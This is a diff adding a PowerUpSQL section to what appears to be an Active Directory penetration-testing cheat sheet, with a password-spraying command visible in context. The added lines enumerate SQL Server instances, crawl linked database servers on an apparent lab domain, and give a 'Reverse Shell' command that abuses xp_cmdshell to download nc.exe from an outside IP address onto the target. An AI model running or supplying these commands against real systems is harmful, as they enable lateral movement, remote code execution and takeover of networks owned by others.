@@ -127,6 +127,30 @@ Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList
 ```
 
 ---
+### PowerUpSQL
+__SQL Servers__
+```powershell
+Get-SQLInstanceDomain
+```
+
+__DB links__
+```powershell
+Get-SQLServerLink -Instance devsrv.garrison.castle.local
+```
+
+```powershell
+Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Verbose
+```
+
+__Reverse Shell__
+```powershell
+Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query
+`exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile('http://172.16.99.11/nc.exe',"C:\Windows\Temp\nc.exe")"`
+```
+
+
+
+---
 ### Kerberos Unconstrained Delegation
 
 Discover domain computers which have unconstrained delegation enabled:
